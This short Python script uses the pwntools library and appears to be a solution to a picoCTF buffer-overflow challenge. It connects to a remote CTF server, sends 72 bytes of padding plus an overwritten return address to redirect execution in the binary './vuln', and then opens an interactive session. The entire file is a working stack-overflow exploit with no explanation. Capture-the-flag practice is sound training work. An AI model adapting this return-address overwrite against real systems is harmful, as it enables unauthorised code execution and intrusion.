from pwn import *
app = './vuln'

p = remote('saturn.picoctf.net', 53919)

payload = cyclic(72) + p64(0x000000000040123b)
p.sendlineafter(':', payload)
p.interactive()
